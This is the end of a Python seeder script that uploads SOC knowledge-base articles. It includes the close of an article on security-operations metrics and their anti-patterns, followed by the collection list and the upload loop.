|   -> Action: New detection rule in development           |
|                                                          |
| KEY INCIDENTS                                            |
| - 2 x SEV-2 (both contained, no data loss)              |
| - 0 x SEV-1                                              |
| - 14 x SEV-3 (12 resolved, 2 pending)                   |
|                                                          |
| (v) = improving  (^) = improving  (-) = stable          |
+----------------------------------------------------------+
```

---

## Metrics Anti-Patterns

### Measuring Tickets Closed

**Problem:** Incentivizes fast closure, not thorough investigation. Analysts will rush through alerts to hit numbers.
**Better:** Measure triage quality via peer review scores alongside volume.

### Measuring Mean Time to Acknowledge

**Problem:** Acknowledging an alert is not the same as investigating it. An analyst can "acknowledge" in 30 seconds but not start real triage for an hour.
**Better:** Measure time to first meaningful action (query run, enrichment performed, note added).

### Vanity Metrics

**Problem:** "We processed 50,000 alerts this month" sounds impressive but says nothing about effectiveness. Those could all be false positives that were auto-closed.
**Better:** Report alerts that led to confirmed incidents and actions taken.

### Gaming-Prone Metrics

Any metric tied to individual performance reviews will be gamed:
- Alerts closed per hour -> alerts closed without investigation
- MTTR per analyst -> premature closure to improve numbers
- Escalation rate -> under-escalation or over-escalation depending on target

**Solution:** Use metrics for team and process improvement, not individual evaluation. Evaluate individuals through quality reviews, peer feedback, and incident outcomes.

---

## Building a Metrics Program

### Month 1: Foundation
- Instrument your SIEM and ticketing system to capture timestamps
- Define your severity classification (see: Incident Severity Classification)
- Start measuring: alert volume, FP rate, MTTR

### Month 2-3: Expansion
- Add MTTD tracking for confirmed incidents
- Build your first ATT&CK coverage map
- Implement analyst time-tracking (lightweight -- 5 categories, end of shift)

### Month 4-6: Maturation
- Build the monthly dashboard
- Start trend analysis (month-over-month comparisons)
- Add qualitative metrics (triage quality scores, analyst satisfaction)

### Ongoing: Continuous Improvement
- Quarterly metric review with SOC leadership
- Adjust targets based on organizational risk appetite
- Benchmark against industry reports (SANS SOC Survey, Ponemon)

---

## References

- MITRE: "11 Strategies of a World-Class Cybersecurity Operations Center" -- Chapter 9: Metrics
- SANS SOC Survey (annual) -- industry benchmarking data
- Ponemon Institute: "The Economics of Security Operations Centers"
- Verizon DBIR (annual) -- dwell time and detection statistics
- "Measuring and Managing Information Risk" (Hubbard & Seiersen) -- quantitative risk metrics
- CIS Controls: Metrics and benchmarks for security operations
"""
    ))

    return articles




# ============================================================
# COLLECTIONS CONFIGURATION
# ============================================================

COLLECTIONS = [
    (
        "Threat Hunting Playbooks",
        "Step-by-step threat hunt procedures with queries, IOC patterns, and decision trees",
        threat_hunting_articles,
    ),
    (
        "Alert Investigation Playbooks",
        "Concrete step-by-step guides for investigating common SOC alert types",
        alert_investigation_articles,
    ),
    (
        "Blue Team Tooling",
        "Hands-on operational guides for defensive security tools",
        blue_team_tooling_articles,
    ),
    (
        "Active Defense & Hardening",
        "Practical defensive measures, configurations, GPOs, and monitoring architecture",
        active_defense_articles,
    ),
    (
        "Log Analysis Deep Dives",
        "Real investigation scenarios walking through actual log data and correlations",
        log_analysis_articles,
    ),
    (
        "SOC Analyst Tradecraft",
        "Practical SOC operations, day-to-day analyst tradecraft, and process guides",
        soc_tradecraft_articles,
    ),
]


def main():
    print("=" * 60)
    print("ION Blue Team Knowledge Base Seeder")
    print("=" * 60)

    login()

    parent_id = get_or_create_collection(
        "Knowledge Base",
        "SOC Analyst Reference Library",
    )

    total = 0
    for col_name, col_desc, article_fn in COLLECTIONS:
        print(f"\n{'=' * 50}")
        print(f"Collection: {col_name}")
        print(f"{'=' * 50}")
        col_id = get_or_create_collection(col_name, col_desc, parent_id)
        articles = article_fn()
        for title, tags, content in articles:
            upload_article(title, content, tags, col_id)
            total += 1
            time.sleep(0.05)

    print(f"\n{'=' * 60}")
    print(f"Done! Uploaded {total} articles to Knowledge Base.")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()


